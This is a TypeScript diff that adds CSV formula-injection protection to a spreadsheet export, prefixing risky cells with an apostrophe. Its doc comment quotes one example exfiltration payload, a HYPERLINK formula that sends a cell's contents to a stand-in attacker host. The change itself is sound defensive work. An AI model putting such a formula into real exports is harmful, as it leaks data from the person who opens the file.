@@ -215,6 +215,32 @@ export function mapRows(grid: string[][]): ParseResult {
 }
 
 /**
+ * Characters that make Excel and Google Sheets treat a cell as a formula.
+ *
+ * TAB and CR are in the set because both begin a cell the same way once the file
+ * has been parsed, and neither is visible in the source data.
+ */
+const FORMULA_START = /^[=+\-@\t\r]/;
+
+/**
+ * Defuses a cell that a spreadsheet would execute rather than display.
+ *
+ * Not hypothetical here. Contact names arrive through the public form, which is
+ * unauthenticated, so the value is attacker-chosen: a lead named
+ * `=HYPERLINK("http://evil.example?x="&A1)` or a DDE payload runs on the machine
+ * of whoever opens the export — the client, not the attacker. A QA pass submitted
+ * a lead named `=1+1` and it came back as the first cell of the file.
+ *
+ * A leading apostrophe is the standard remedy: Excel and Sheets both read it as
+ * "the rest is text" and do not render it. The value stays legible to anything
+ * parsing the CSV as data, which is why this belongs here rather than in a
+ * validation rule on the way in — the name is not the problem, executing it is.
+ */
+export function neutralizeFormula(value: string): string {
+  return FORMULA_START.test(value) ? `'${value}` : value;
+}
+
+/**
  * toCSV builds a CSV file from the rows currently on screen.
  *
  * The BOM is required: without it Excel reads the file as ANSI and renders ₹ as
@@ -222,7 +248,7 @@ export function mapRows(grid: string[][]): ParseResult {
  */
 export function toCSV(headers: string[], rows: (string | number)[][]): string {
   const escape = (v: string | number) => {
-    const s = String(v ?? "");
+    const s = neutralizeFormula(String(v ?? ""));
     // Quote anything containing a delimiter, quote, or newline.
     return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
   };
